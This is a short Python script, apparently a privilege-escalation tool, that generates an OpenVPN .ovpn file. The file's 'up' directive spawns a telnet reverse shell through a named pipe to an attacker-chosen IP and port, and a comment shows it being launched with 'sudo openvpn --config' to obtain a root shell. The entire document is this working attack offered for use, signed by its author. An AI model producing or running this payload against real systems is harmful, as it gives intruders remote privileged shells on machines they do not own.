import sys

#sudo openvpn --config file.ovpn

ip = sys.argv[1]
port = sys.argv[2]
filename = sys.argv[3]

def create(ip,port,filename):
	payload = f"""up '/bin/sh -p -c "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF"'
	dev null
	script-security 2"""

	with open(f'{filename}.ovpn', 'w') as f:
		f.write(payload)
		f.close()

	print("-" * 50)
	print(f'[+] {filename}.ovpn created')
	print('[!!] Created by Boogsta')
	print("-" * 50)
	exit()

create(ip,port,filename)
